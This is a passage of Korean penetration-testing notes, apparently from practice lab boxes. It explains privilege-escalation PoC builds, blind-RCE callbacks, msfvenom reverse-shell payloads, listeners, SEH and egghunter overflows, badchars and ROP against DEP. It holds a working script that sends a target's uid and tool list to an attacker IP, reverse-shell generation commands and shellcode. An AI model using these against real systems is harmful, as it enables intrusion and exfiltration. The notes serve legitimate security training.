- **중첩 따옴표가 아예 없음** — 경로를 쉼표로 나열하고 파이프 대신 cmdlet 파라미터를 씀
- `2>nul` 대신 `-ErrorAction SilentlyContinue` — PowerShell 고유 문법이라 리눅스 문법과 섞일 여지가 없음

→ **경유 계층이 3개를 넘으면:** ①중첩 따옴표를 쓰지 말 것(쉼표 나열·배열·cmdlet 파라미터) ②셸 문법을 섞지 말 것(PowerShell 이면 `2>nul` 도 `2>/dev/null` 도 안 씀) ③정 복잡하면 `powershell -enc <base64>`(B-81) ④또는 스크립트를 파일로 뺄 것 ⑤**결과가 비었으면 반드시 출력이 나오는 명령(`whoami`)을 같은 방식으로 한 번 쳐서 「명령이 실행됐는가」부터 검증할 것.**

#### B-85. 「타겟 glibc 가 낮아서 안 될 것」은 추측이다 — 심볼 버전을 확인하라

**증상** — 최신 Kali(glibc 2.35+)에서 빌드한 `.so`/ELF 를 낡은 타겟(Debian 9, glibc 2.24)에 심으려니 심볼 불일치가 걱정됨.

```bash
objdump -T <파일> | grep -o 'GLIBC_[0-9.]*' | sort -u
```

**정적 링크가 아닌 이상 «요구 심볼의 최소 버전»만 타겟 glibc 이하면 그대로 로드됨.**

[[Wombo]] 실측 — 재빌드본과 저장소 prebuilt 둘 다 통과:

| 파일 | 요구 심볼 |
|---|---|
| 재빌드 `exp.so` | `GLIBC_2.2.5` |
| prebuilt `exp.so.prebuilt.bak` | `GLIBC_2.2.5` · `GLIBC_2.4` |

둘 다 Debian 9 의 2.24 이하 → **glibc 는 애초에 문제가 아니었고, 재빌드가 성공의 원인이었다는 증거도 없음.**

**실제로 필요했던 것은 glibc 대응이 아니라 «현대 gcc 대응»이었음** — `arpa/inet.h`·`string.h` 인클루드 누락(구 코드가 암시적 선언에 의존)과 `-Wall`→`-w` 로 `-Werror` 완화. **빌드가 안 되는 것과 타겟에서 안 도는 것을 섞지 말 것.**

#### B-86. 타겟에 컴파일러가 없다 — C PoC 를 못 빌드한다

**서버 박스에 `gcc` 등 빌드 도구가 없는 것은 흔한 상황임.** 로컬 권한상승 익스플로잇은 **항상 이 경우를 대비해 둘 중 하나를 준비**할 것:
- **(a) ELF 를 base64 로 내장해 파이썬이 디코드만 하는 포팅본** — 타겟에 Python 만 있으면 컴파일 없이 동작
- **(b) Kali 에서 `gcc -static` 으로 정적 컴파일한 바이너리를 통째로 전송** — C 전용 PoC 밖에 없으면 시험장에서 그 자리에 이것을 함

[[Exghost]] 실측(PwnKit, CVE-2021-4034) — 원조 PoC 는 **타겟에서** C 익스플로잇과 공유 라이브러리를 `gcc` 로 빌드해야 하는데 컴파일러가 없어, ELF 페이로드를 base64 로 내장한 파이썬 PoC(**`joeammond/CVE-2021-4034`**, 이 박스에서 실제 클론)로 대체했음.
⚠️ **저장소를 `berdav` 로 적지 말 것** — `~/PG/Exghost/pwnkit/.git/config` 의 remote 가 `https://github.com/joeammond/CVE-2021-4034` 이고 `git log` 최상단도 그 저장소와 일치함. `~/.zsh_history` 에 있는 `berdav/CVE-2021-4034.git` 클론은 **다른 박스([[Levram]]) 작업**임.

전송·확인 절차는 B-82(전송 후 `ls`/`md5sum`), 전송 도구 부재는 B-83, glibc 심볼 판정은 B-85.


**[[plum]]** — `raptor_exim_wiz` 는 `gcc` 가 실패하면 `cp /bin/sh /tmp/pwned` 로 조용히 폴백함. 즉 **컴파일러 부재를 스크립트가 말해주지 않고 「setuid 가 안 걸린 평범한 셸」로 나타남**(A-12). 반사 확인:
```bash
which gcc cc make python3 perl
```
없으면 Kali 에서 정적 링크로 빌드해 전송(`gcc -static -o exp exp.c`, 타겟 아키텍처 일치 필요).
⚠️ **[가정]** — 폴백은 `gcc` 의 종료 코드가 0이 아닐 때 실행되므로 `gcc` 부재가 가장 유력하지만, `PATH` 에 없거나(웹서버 자식 프로세스의 빈약한 `PATH`) 컴파일 자체가 실패한 경우도 같은 결과를 냄. [[plum]] 에서 `which gcc` 를 안 쳤으므로 확정 불가임.

#### B-87. 블라인드 RCE 의 오라클은 «내 HTTP 서버 액세스 로그»다

**출력이 안 돌아오는 RCE 에서 가장 싼 성공 판정 채널은 내 `python3 -m http.server` 액세스 로그임.** 3초면 뜨고, 404 여도 상관없음 — **요청이 도착했다는 사실만** 필요함.

- `ping`(ICMP)은 막히면 못 씀. DNS 는 로그를 따로 띄워야 함
- 응답을 못 받아도 **값을 URL 경로에 실어 되돌려 받을 수 있음.** [[ClamAV]] 의 도구 인벤토리 스크립트:
```sh
#!/bin/sh
W=/usr/bin/wget
U=http://192.168.45.207
$W $U/uid=$(id -u)-$(id -un)
for b in perl nc netcat python telnet bash socat mkfifo; do
  p=$(which $b 2>/dev/null | tr / _)
  $W "$U/bin-$b=${p:-none}"
done
```
— 출처: `~/PG/ClamAV/www/d.sh`
`tr / _` 는 경로의 `/` 가 URL 경로 구분자로 먹혀 값이 갈라지는 것을 막음.
```text
"GET /uid=0-root HTTP/1.0" 404 -
"GET /bin-perl=_usr_bin_perl HTTP/1.0" 404 -
"GET /bin-nc=none HTTP/1.0" 404 -
"GET /bin-netcat=none HTTP/1.0" 404 -
"GET /bin-python=none HTTP/1.0" 404 -
"GET /bin-telnet=_usr_bin_telnet HTTP/1.0" 404 -
"GET /bin-bash=_bin_bash HTTP/1.0" 404 -
"GET /bin-socat=none HTTP/1.0" 404 -
"GET /bin-mkfifo=_usr_bin_mkfifo HTTP/1.0" 404 -
```
— 출처: `~/PG/ClamAV/http_stager.log`
- 한 번에 `uid=0-root`(이미 게임 끝)와 `nc`·`python`·`socat` 부재 / perl 존재가 동시에 나옴

⚠️ **`http.server` 로그를 «파일로» 남길 것.** [[ClamAV]] 의 `http_stager.log` 는 tmux `capture-pane` 스냅샷(14:36:20)이라 **그 이후 요청이 통째로 없음** — try15~17(14:37~14:39)의 계측을 덮는 로그가 영영 사라졌고, 그래서 「93자 절단」의 직접 계측치(64자)가 재확인 불가로 남음(A-39 ②).

→ **[[Mice]] 의 「egress 결과를 URL 경로로 회신」과 같은 수법의 리눅스 판**임(A-31). 셸을 던지기 전에 이 한 번을 돌리면 「도구 없음 / 아웃바운드 차단 / 페이로드 문법」 세 갈래를 미리 잘라냄(B-83).

#### B-88. msfvenom 산출물은 md5 로 구분되지 않는다 — `49bc` 뒤 sockaddr 을 봐라

**증상** — 서빙 디렉터리에 같은 크기의 exe 가 여럿 남아 어느 것이 어디로 콜백하는지 모름.

**md5 는 답이 아님.** 같은 인자로 만들어도 매번 다른 해시가 나옴(섹션 이름 무작위 + PE 체크섬 추종). [[Jacko]] 실측:
```bash
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe -o a.exe
┌──(kali㉿kali)-[/tmp]
└─$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.215 LPORT=8082 -f exe > b.exe
┌──(kali㉿kali)-[/tmp]
└─$ md5sum a.exe b.exe
a2984855b58b20ad360abb7f01c20b1f  a.exe
94bae36e4f415f8496aefeefa9ce73c3  b.exe
```
(두 msfvenom 의 배너 출력은 잘라냄. 둘 다 `Final size of exe file: 7680 bytes`)

**답은 `49bc` 뒤의 `sockaddr_in` 을 읽는 것** — `xxd <exe> | grep 49bc`. `0200`(AF_INET) → 포트 2바이트(네트워크 바이트순) → IPv4 4바이트. [[Jacko]] 의 두 exe(둘 다 7,680B)가 이 세 바이트열로만 갈렸음 — `0087` = 135 / `1f92` = 8082, IP 는 둘 다 `c0a82dd7` = 192.168.45.215.

⚠️ **B-82(「파일 전송 후 `ls`/`md5sum` 으로 확인한다」)와 충돌하지 않음** — 저쪽의 md5 는 *Kali 원본 ↔ 타겟 사본* 동일성 확인용이고, 여기서 안 되는 것은 *어느 페이로드인지 식별*임.

→ **애초에 파일명에 포트를 박으면 이 확인이 필요 없음**(`rev-8082.exe`, A-31 0단계). 크기만으로도 meterpreter(수백 KB) ↔ `shell_reverse_tcp`(7~8KB)는 즉시 갈림.

#### B-89. 리스너는 `tmux` + `rlwrap` 으로 띄운다

```bash
tmux new-session -d -s <이름> 'rlwrap nc -lvnp 4444'
```
- `tmux new-session -d -s <이름> '<명령>'` — `-d`(detached)로 백그라운드 실행. **비대화형 SSH 로 몰 때 셸이 안 끊김.** 터미널을 닫아도 리스너가 삶
- `rlwrap` — readline 래핑. **↑↓ 명령 히스토리와 ←→ 커서 이동이 raw 리버스셸에서도 동작함.** TTY 없는 리버스셸에서는 오타를 백스페이스로 못 고치는데 `rlwrap` 이 그 고통을 절반쯤 없애므로 **리버스셸 리스너에는 항상 붙일 것**
- `nc -lvnp 4444` — `l`isten · `v`erbose · `n`o-DNS · `p`ort. **`-n` 을 빼면 역방향 DNS 조회로 접속 표시가 수 초 지연됨**

⛔ **파이프(`| tee`)로 감싸지 말 것** — 블록 버퍼링 때문에 `capture-pane` 에 아무것도 안 보여 **「셸이 안 붙었다」로 오독하게 됨.** 기록이 필요하면 `tmux pipe-pane` 이나 별도 로그를 잡을 것(A-31).
⛔ **띄우기 «전»에 `ss -lntp` 로 그 포트가 비어 있는지 볼 것** — 이 볼트는 박스를 병렬로 돌리므로 포트 충돌이 상시 위험임. 정리할 때도 **PID 를 특정해 내 것만** 죽이고 tmux 는 **세션 이름으로만** 종료할 것(광범위 `pkill` 금지, C-5).

**출처** — [[Crane]] · [[pyLoader]] · [[Fikklish]](포트 공유 사고).

| 조각 | 역할 | 빼면 |
|---|---|---|
| `tmux new-session -d -s <이름>` | 리스너를 **분리 세션**에 | 터미널이 리스너에 묶여 다음 명령을 못 침 |
| `rlwrap` | readline 래핑 — **↑ 히스토리·백스페이스·화살표** | 원시 nc 셸에서 오타를 못 지움 |
| `-v` | 연결 정보 출력 | 어디서 붙었는지 안 보임 |
| `-n` | DNS 역조회 안 함 | 역조회 대기로 몇 초 지연 |

**1024 미만 포트(443·80·53)에는 `sudo` 가 필요함.** 아웃바운드가 막힌 박스에서는 그쪽이 정답임([[Hawat]]).

⛔ **「실패한 것 같아도 리스너는 끄지 마라.」** 익스가 실패한 것처럼 보여 다른 경로를 파는 «동안» 셸이 붙는 상황이 실재함([[Astronaut]] — 크론 발화까지 최대 60초).
→ **분리 세션이 이 규율의 «실행 장치»임** — 다른 작업을 하면서도 셸이 살아 있어야 성립함. 판정 시한은 D 절 표에 있음.

#### B-8-10. msfvenom 은 잘못된 인자를 «조용히» 삼킨다 — 출력 3줄로 검증한다

**증상** — 인코더를 지정했다고 믿었는데 다른 인코더가 쓰임. 에러도 경고도 없음.

옵션 파싱 후 남은 인자를 msfvenom 이 **datastore 대입으로** 처리하기 때문임:
```ruby
if args
  args.each do |x|
    k,v = x.split('=', 2)
    datastore[k.upcase] = v.to_s
```
`x86/alpha_mixed` 에는 `=` 가 없으므로 `k = "x86/alpha_mixed"`, `v = ""` 가 되어 **`datastore["X86/ALPHA_MIXED"] = ""` 라는 쓰레기 키로 삼켜짐.**

**출력으로 구별할 것:**
```text
-e 있음 :  Found 1 compatible encoders
           Attempting to encode payload with 1 iterations of x86/alpha_mixed
           x86/alpha_mixed succeeded with size ...

-e 없음 :  Found 11 compatible encoders           ← 복수형이면 자동 선택임
           ... chosen with final size ...          ← "chosen" 이라는 단어
```
**`chosen` 이 보이면 msfvenom 이 고른 것임.** 내가 골랐다면 `succeeded` 만 나옴.

**셸코드 첫 12바이트가 어느 인코더인지 말해 줌.** [[Kevin]] 실측 — `31 c9 83 e9 ae e8 ff ff ff ff c0 5e 81 76 0e …` 는 `x86/call4_dword_xor` 의 디코더 스텁과 일치함:
```ruby
"\xe8\xff\xff\xff" + # call $+4
"\xff\xc0" +         # inc eax
"\x5e" +             # pop esi
"\x81\x76\x0eXORK" + # xor [esi + 0xe], xork
"\x83\xee\xfc" +     # sub esi, -4
"\xe2\xf4"           # loop xor
```
`alpha_mixed` 였다면 `PYIIIIIIIIIIIIIIII7QZjA…` 같은 **순수 ASCII** 여야 함. 전혀 그렇지 않았음.

**왜 그래도 성공했는가** — `call4_dword_xor` 는 **self-locating 디코더**임. `call $+4` → `pop esi` 로 자기 주소를 스스로 구하므로 모듈이 지정한 `BufferRegister => EDI` 같은 도움이 필요 없음. `alpha_mixed` 였다면 디코더가 셸코드 시작 주소를 담은 레지스터를 알아야 했고 에그헌터의 `jmp edi` 덕분에 EDI 가 그 역할을 했을 것임. **두 경로 모두 성립하지만 성립한 «이유»가 다름** — 「우연히 통한 명령」은 다음 박스에서 실패함.

**생성 후 badchar 가 실제로 없는지 확인할 것:**
```bash
msfvenom ... -f raw -o sc.bin
for b in 00 0a 0b 0d 1a 20 2c 3a 3b 2f 5c; do \
  printf "%s: " $b; xxd -p sc.bin | tr -d '\n' | grep -o "$b" | wc -l; done
```
**0 이 아닌 줄이 있으면 그 badchar 가 안 걸러진 것임.** 주석에 박힌 msfvenom 명령을 그대로 믿지 말라는 쪽은 A-14.

#### B-8-11. FTP 는 `binary` 모드 — 크기 불일치는 CRLF 형과 truncation 형을 갈라서 진단한다

**증상** — 전송이 「성공」으로 끝났는데 실행이 안 되거나 디스어셈블이 이상함. FTP 클라이언트의 기본 전송 모드는 `ascii` 라 줄바꿈을 플랫폼 규약에 맞게 변환하고, 그래서 **바이너리 안의 `0x0d`/`0x0a` 가 데이터가 아니라 개행으로 처리돼 소실됨.**
```bash
ftp <타겟>
ftp> binary            # 이 한 줄. 별칭 bin / type image
ftp> get <파일>
ftp> bye
ls -l <파일>            # 서버가 알려준 크기와 대조
```

**⚠️ `file` 출력이 분기를 알려줌.** [[Osaka]] 실측(2026-08-26 재확인):
```text
$ file ~/PG/Osaka/ftp.exe
ftp.exe: MS-DOS executable, MZ for MS-DOS
```
`e_lfanew`(오프셋 `0x3c`)는 `0x00000100` 을 가리키는데 실제 `PE\0\0` 시그니처는 **`0xff`** 에 있음 — DOS 스텁에서 CR 1바이트가 빠져 이후 전체가 1바이트 앞으로 밀린 것이고, 그래서 `file` 이 PE 파싱에 실패해 DOS 스텁까지만 인식함.
→ **`file` 이 `MS-DOS executable` 로 떨어지면 그 자체가 「헤더가 밀렸다」 = CRLF 변환형 손상의 신호임.** 순수 truncation 형이면 헤더는 멀쩡해 `file` 이 여전히 `PE32 executable` 이라 답함 — **두 손상은 `file` 한 줄로 갈림.**

**⚠️ 그런데 손상 «규모»는 CRLF 만으로 설명되지 않았음.** 회수된 `ftp.exe` 는 55,971바이트인데 PE 섹션 테이블이 요구하는 크기는 158,208바이트 — **35%만 남아 65%가 빔.** 같은 밀도로 계속됐다면 전송 바이트의 절반 이상이 `\r`/`\n` 이어야 하는데 x86 기계어에서 나올 수 없는 비율임. **더 유력한 설명은 전송이 중간에 끊긴 것**(부분 전송)이고, 원인(네트워크 드롭 · `ascii` 모드로 인한 조기 종료 · 수동 중단)은 산출물로 확정 불가.
⚠️ 개작 전 노트는 「전송이 중간에 끊긴 것이 «아니라» 바이트가 군데군데 소실됐다」고 **단정**했으나, PE 섹션 테이블을 직접 파싱해 원본 크기를 재계산한 결과 그 단정이 **반증됨.**
→ **일반화 — 예상 크기 대비 실제 크기 비율로 진단을 가를 것.** 90% 이상이면 CRLF 형, 그 아래로 크게 떨어지면 truncation 형이고 **후자는 `binary` 모드를 켜도 재현될 수 있으므로 재전송 후 반드시 바이트 수를 다시 대조**할 것.

→ **같은 규칙이 다른 도구에도 적용됨 — 전송 성공 판정은 «종료 코드»가 아니라 «크기·해시»임**(B-82). `certutil`(404 본문 저장) · `wget`·`curl -O`(에러 페이지 저장) · `scp`(부분 전송) 전부 같은 함정.

### B-9. 메모리 손상 · 바이너리 익스플로잇

#### B-91. SEH 기반 스택 오버플로우 — 지문 하나로 구조 전체가 읽힌다

**PoC 를 열면 SEH 형인지 고전형인지부터 판별할 것.**

| | 리턴 주소 덮어쓰기(고전형) | SEH 덮어쓰기 |
|---|---|---|
| 덮는 대상 | 함수의 저장된 EIP | 예외 핸들러 체인(nSEH+SEH) |
| 필요한 가젯 | `jmp esp` · `call esp` | `pop / pop / ret` |
| 착지 지점 | 대개 덮어쓴 곳 바로 뒤 | nSEH(4바이트) → 앞으로 점프 |
| PoC 에서의 지문 | `"\x90"*N + shellcode` 뒤에 주소 | `\xeb\xXX\x90\x90` + 3~4바이트 주소 |
| 우회 대상 | — | SafeSEH · SEHOP |

**주소 앞 4바이트가 `\xeb` 로 시작하면 SEH 형임.**

Windows 는 스레드마다 예외 핸들러 체인을 스택 위에 두고 각 노드는 8바이트임 — `nSEH`(다음 노드 주소) 4바이트 + `SEH`(핸들러 함수 포인터) 4바이트. 스택을 넘치게 하면 이 8바이트도 덮이고, 오버플로우 자체가 예외를 일으키므로 Windows 가 곧바로 예외 처리 경로로 들어가 **우리가 덮어쓴 `SEH` 주소로 점프함.**

**그런데 `jmp esp` 를 못 씀** — 디스패처가 핸들러를 호출할 때 우리가 통제하는 데이터의 주소는 레지스터가 아니라 **스택 위(ESP+8)** 에 있음. 그래서 POP/POP/RET 이 답임:
```text
예외 발생 → 디스패처가 SEH 주소로 점프
            이때 스택: [ESP+0]=? [ESP+4]=? [ESP+8]=nSEH의 주소

pop esi      ; 스택 4바이트 버림
pop ebx      ; 스택 4바이트 더 버림   → ESP 가 이제 nSEH 를 가리킴
ret 0x10     ; ESP 가 가리키는 값(=nSEH 의 주소)으로 점프
             ★ 결과: nSEH 위치의 4바이트가 "실행"된다
```
**즉 nSEH 4바이트가 명령어가 됨.** 거기에 `\xeb\xc2`(`jmp short -62`) + `\x90\x90`(패딩)을 넣음. 4바이트로 갈 수 있는 거리는 짧으므로 **뒤가 아니라 앞으로(음수) 점프**해 미리 배치해 둔 NOP 슬레드로 되돌아감.

⛔ **PoC 의 `Offset` 변수를 「EIP·SEH 까지의 거리」로 착각하지 말 것.** 익스플로잇마다 `offset` 이 무엇을 세는지 다름 — [[Kevin]] 의 `Offset => 721` 은 nSEH 까지의 거리가 아니라 「패딩 + NOP + 에그헌터」의 합이고 실제 nSEH 는 **751바이트 지점**임. **패턴을 직접 만들어 확인하는 것이 유일하게 확실한 방법임:**
```bash
msf-pattern_create -l 1000
msf-pattern_offset -l 1000 -q <크래시 시점의 SEH 값>
```

**마지막 바이트가 널인 주소는 3바이트로 보냄.** `0x004174d5` 는 리틀엔디언으로 `d5 74 41 00` 이고 널은 문자열을 끊음. 문자열 «끝»에 두면 나머지 널은 대상 애플리케이션이 채워 줌 — Metasploit 모듈이 이 요령을 명시함:
```ruby
buffer << [target.ret].pack('V*')[0, 3] # SEH (strip the null byte, HP PM will pad it for us)
```

#### B-92. 에그헌터 — 버퍼가 셸코드보다 좁을 때의 표준 해법

**판단 기준 셋:**
1. **덮어쓸 수 있는 버퍼 크기 < 셸코드 크기** → 에그헌터
2. **셸코드를 다른 필드·헤더로도 보낼 수 있음** → 에그헌터가 성립
3. 둘 다 아니면 → 스테이저(`shell_bind_tcp` 대신 `shell/bind_tcp` 같은 2단계 페이로드)

버퍼에는 **32바이트짜리 스캐너만** 넣고 셸코드는 프로세스 메모리 다른 곳에 둠([[Kevin]] 은 HTTP `Accept:` 헤더). 에그헌터가 메모리를 훑어 4바이트 태그가 **연속 두 번** 나오는 곳을 찾고 그 바로 뒤로 점프함.
```text
66 81 ca ff 0f     or   dx, 0x0fff        ; 페이지 경계로 정렬 (edx |= 0xfff)
42                 inc  edx               ; 다음 주소
52                 push edx               ; 저장
6a 02              push 2
58                 pop  eax               ; eax = 2 (NtAccessCheckAndAuditAlarm)
cd 2e              int  0x2e              ; 시스템 콜  ★ 핵심
3c 05              cmp  al, 5             ; STATUS_ACCESS_VIOLATION 인가?
5a                 pop  edx               ; 복원
74 ef              je   <위로>            ; 접근 불가 페이지면 건너뛴다
b8 62 33 33 66     mov  eax, 0x66333362   ; "b33f"  ← 태그
89 d7              mov  edi, edx
af                 scasd                  ; [edi]와 eax 비교, edi += 4
75 ea              jne  <위로>
af                 scasd                  ; 한 번 더 (b33fb33f 연속 2회 확인)
75 e7              jne  <위로>
ff e7              jmp  edi               ; ★ 셸코드로 점프
```
**트릭 둘:**
1. **`int 0x2e` 로 페이지 유효성을 검사함.** 메모리를 그냥 읽으면 매핑 안 된 페이지에서 크래시함. 커널에 주소를 넘겨 커널이 대신 확인하게 하면 유효하지 않을 때 `STATUS_ACCESS_VIOLATION`(0x05)을 돌려줄 뿐 **프로세스가 죽지 않음.** skape 의 고전 기법
2. **태그를 두 번 반복시킴**(`b33fb33f`). 한 번만 찾으면 에그헌터 **자기 안에 있는 태그 상수**(`b8 62 33 33 66`)를 자기가 발견해 버림. 두 번 연속을 요구하면 셸코드 앞의 진짜 태그만 걸림

**대가는 속도임** — 프로세스 메모리 전체를 훑으므로 수 초~수십 초. PoC 가 `time.sleep(30)` 을 두는 이유가 이것이고, egg 소실과의 구분은 A-3-15.
- 원 논문 — skape, "Safely Searching Process Virtual Address Space"

#### B-93. badchar 는 「셸코드가 실리는 위치의 파서」가 결정한다

**흔한 오해 — 「URL 인코딩 때문」이 아님.** [[Kevin]] 의 `fileName` 은 `urllib.quote_plus()` 로 인코딩해 보내므로 원칙적으로 임의 바이트를 실을 수 있었음(널만 예외). **진짜 제약은 셸코드가 실리는 `Accept:` 헤더** — 여기에는 인코딩 없이 원본 바이트가 들어감.

| 바이트 | 왜 금지인가 |
|---|---|
| `\x00` | C 문자열 종료 — 헤더가 거기서 잘림 |
| `\x0a` `\x0d` | LF·CR — 헤더가 끝나버림. 요청 구조 자체가 깨짐 |
| `\x20`(SP) `\x0b` | 공백류 — HTTP 토큰 분리 |
| `\x3a`(`:`) | 헤더 이름·값 구분자 |
| `\x2c`(`,`) `\x3b`(`;`) | `Accept` 헤더의 MIME 타입·파라미터 구분자 |
| `\x2f`(`/`) | MIME 타입의 `type/subtype` 구분자 |

**경로를 따라가며 셀 것:**
- HTTP 헤더에 실림 → `\x00 \x0a \x0d \x20` + 그 헤더의 구분자
- HTTP 바디(폼)에 실림 → `\x00` + `&` `=`(인코딩 안 할 경우)
- URL 경로에 실림 → `\x00 ? # / % SP`
- 파일명으로 저장됨 → `\x00 / \ : * ? " < > |`
- SQL 문자열 안 → `\x00 ' " \`

**badchar 를 몰라도 찾는 법** — `\x01` 부터 `\xff` 까지 전 바이트를 버퍼에 넣고 크래시 시점의 메모리를 디버거로 비교함(`!mona compare`). 디버거를 붙일 수 있는 상황이면 이게 정공법임. 생성물 검증은 B-8-10.

#### B-94. 하드코딩 리턴 주소의 «출처»가 OS 이식성을 결정한다

| 가젯 출처 | OS 의존성 | 신뢰도 |
|---|---|---|
| 애플리케이션 자기 자신(`DevManBE.exe` 등) | 없음. 앱 버전만 같으면 어느 Windows 에서든 같은 주소 | ★★★ |
| 앱이 번들한 서드파티 DLL | 없음(동일 조건) | ★★★ |
| OS DLL(`kernel32`·`ntdll`·`user32`) | 높음. OS·SP·핫픽스마다 주소가 바뀜 | ★ |

**익스플로잇을 고를 때 주석의 가젯 출처를 먼저 볼 것.** 애플리케이션 이름이나 앱 번들 DLL 이면 → **OS 가 달라도 될 확률이 높음.** `kernel32.dll`·`ntdll.dll` 이면 → 정확한 OS·SP 가 맞아야 하고, 안 맞으면 주소를 직접 찾아야 함(`!mona modules` → `!mona seh`) — **디버거를 붙일 수 있을 때만 가능함.**

[[Kevin]] 이 그 사례임 — Metasploit 모듈의 타겟 문자열이 `Windows XP SP3 / Win Server 2003 SP0` 인데 타겟은 Windows 7 7600 이었고 **그래도 동작했음.** 주석이 `# pop esi # pop ebx # ret 10 (DevManBE.exe)` 로 가젯 출처를 앱 본체로 지목함. 주소 `0x004174d5` 는 `0x00400000` 대 — PE 실행 파일의 기본 이미지 베이스임.
`[가정]` `/DYNAMICBASE` 미적용을 직접 확인하지는 못했음. 이 이미지가 ASLR 없이 빌드됐다면 항상 같은 주소에 로드되고, 2009년 제품이라 ASLR 미적용이 자연스러우며 **Windows 7 에서 실제로 동작한 것이 경험적 증거**임.

**시험장에서는 앱 기반 가젯 익스플로잇이 훨씬 안전한 선택임.**

#### B-95. nmap 이 못 알아보는 서비스 = 커스텀 바이너리 = 메모리 손상 후보

**`fingerprint-strings` 가 뜨면 그 자체가 신호임.**

| 신호 | 결론 |
|---|---|
| 포트 VERSION 칸이 비어 있음 | nmap 이 제품을 특정 못함 → **커스텀 구현** |
| `1 service unrecognized despite returning data` + `SF-Port21-TCP:` 지문 덤프 | nmap DB 에 없는 서비스 → `searchsploit` 무의미, **프로토콜을 직접 두드릴 것** |
| 긴 입력에 연결이 끊기거나 서비스가 죽음 | **오버플로우 확정 신호** |

⚠️ 지문 덤프 자체는 버리지 말 것 — 이름은 오탐이어도 `SF-Port…-TCP:` 안에는 진짜 정보가 들어 있음(A-11 의 [[Jacko]] H2 사례).

**「커스텀 서비스를 만났다」의 순서:**
1. **명령 열거** — `nc` 로 붙어 `HELP`, 그리고 문서에 없는 단어(`DEBUG`·`TEST`·`ADMIN`·`SITE`·`STAT`)를 찍어봄
   ```text
   nc -nv <타겟> 21
   USER anonymous
   HELP            # 구현된 명령 목록이 나오면 즉시 공격면이 드러남
   SITE HELP
   ```
2. **인증 경계 확인** — 취약 명령이 로그인 «전»인가 «후»인가. 기본 자격증명(`admin:admin`·`anonymous`) 시도
3. **각 명령에 긴 인자** — 100 → 500 → 1000 → 5000바이트. 서비스가 끊기는 명령이 오버플로우 후보
4. **각 명령에 포맷 지정자** — `%x|%x|%x` · `%s` · `%n`. `%x` 가 값으로 치환되면 릭 확보(B-96)
5. **바이너리 확보 시도** — SMB 공유·서비스 자체의 다운로드 명령·웹. 로컬에 같은 서비스를 띄우면 디버깅이 압도적으로 쉬움. **FTP 로 받을 때는 반드시 `binary` 모드**(B-8-11)
6. 크래시 재현 → 오프셋 → 배드캐릭터 → 완화 기능 판정 → 가젯

⛔ **3번과 4번의 순서를 바꾸지 말 것.** 오버플로우로 서비스를 죽이면 포맷 스트링을 시험할 기회가 사라짐(자동 재시작이 없으면 리버트해야 함, A-32).

**응답 «코드»의 차이가 명령 존재 여부를 알려줌** — `500 Unknown command`(없음) vs `501 Syntax error`(있으나 인자가 틀림) vs `530 Not logged in`(있으나 인증 필요). **「에러가 났다 = 그 명령은 없다」가 아님** — 코드를 구분하지 않으면 존재하는 명령을 스스로 지워버림(A-12 의 짝).

#### B-96. 포맷 스트링 릭으로 ASLR 우회 — 64KB 할당 단위로 베이스를 검산한다

**릭 값에서 «진짜 스택 구간»과 «자기 출력 버퍼 구간»을 구분할 것.** `%x` 반복 릭에서 인덱스가 올라갈수록 값이 ASCII 범위(`0x20`~`0x7E`)에 몰리기 시작하면, 그 지점부터는 포맷 문자열 프레임이 아니라 **응답 버퍼 자신을 재귀적으로 읽고 있는 것**임(리틀엔디언으로 되돌리면 응답 문자열 자체가 나옴). 그 앞 4~5개 값만 유효한 포인터임.

**베이스 역산 검산법 — Windows PE 는 4KB 페이지가 아니라 «64KB 할당 단위» 경계에 로드됨.** 계산된 베이스의 하위 16비트가 `0000` 이 아니면 **릭 인덱스를 잘못 잡은 것**임. 식은 `leak - RVA = base` 이고, RVA 는 그 바이너리를 실제로 실행·디버깅해야 나오는 상수임(정적 분석만으로는 안 나옴).

**익스플로잇을 짜기 «전»에 통과시킬 릭 검증 4항목:**
```text
1. 하위 16비트가 0인가?                       0x____0000
2. 값이 ASCII 로 보이지 않는가?
3. 여러 번 실행해도 32비트 사용자 공간 안인가?  0x00010000 ~ 0x7FFEFFFF
4. 오프셋 상수가 매 실행 일정한가?             일정하지 않으면 인덱스가 틀린 것
```
⚠️ **릭 인덱스를 잘못 잡으면 증상이 고약함** — 베이스가 매핑 안 된 주소가 돼 **ROP 가젯 전부가 즉시 액세스 위반**임. 「오프셋이 틀렸나」 「배드캐릭터인가」 「가젯이 잘못됐나」를 먼저 의심하게 돼 진짜 원인(릭 인덱스)에 늦게 도달함. [[Osaka]] 가 그 사례임.

#### B-97. `VirtualAlloc` ROP — `PUSHAD` 한 번으로 호출 프레임을 조립한다

**DEP(NX) 우회 표준형.** mona.py `!mona rop -m <module>` 이 생성하는 `VirtualAlloc` ROP 체인은 `PUSHAD` 하나로 호출 프레임을 만듦 — `PUSHAD` 는 EAX→ECX→EDX→EBX→ESP→EBP→ESI→EDI 순으로 푸시하므로, 미리 레지스터를 `VirtualAlloc(lpAddress, dwSize, flAllocationType, flProtect)` 인자 값으로 채워두면 **`PUSHAD` 직후의 스택이 그대로 호출 프레임**이 됨.

흐름 — POP 가젯들로 레지스터를 채움 → `PUSHAD#RETN` → `RETN` 이 EDI(=RETN 가젯)로 → 한 번 더 `RETN` 이 ESI(=`JMP [EAX]`)로 → `VirtualAlloc` 진입(EAX=함수 포인터) → **stdcall 이라 자기 인자를 정리하며** EBP 값(=`POP EBP#RETN`)으로 반환 → 남은 EAX 슬롯 4바이트를 그 POP 이 삼킴 → `RETN` 이 체인 마지막 `JMP ESP` 로 → ESP 는 이제 NOP+셸코드.

⚠️ **mona 가 생성한 «주석»을 믿지 말고 API 원형과 대조할 것.** `# EDX = 0x1000 (size)` 는 흔한 오기임 — `0x1000` 은 크기가 아니라 **`MEM_COMMIT` 플래그**이고 크기 인자는 EBX 임. 값 배치 자체는 맞아서 익스플로잇은 그대로 동작하지만, **값을 손으로 바꿔야 할 때 주석만 보고 고치면 깨짐.**

**NOP 슬레드는 관례지 항상 필수는 아님.** `VirtualAlloc` 이 stdcall 로 인자를 스스로 정리하고 `POP EBP` 가 남은 슬롯을 삼키는 체인이면 `JMP ESP` 착지점이 결정론적이라 NOP 없이도 동작할 수 있음. 그래도 총 길이가 고정된 페이로드가 아니라면 **넣는 것이 공짜에 가까운 보험**임.

| ASLR | DEP | 필요한 것 | 난이도 |
|---|---|---|---|
| ✗ | ✗ | `EIP = JMP ESP`(교과서형) | 낮음 |
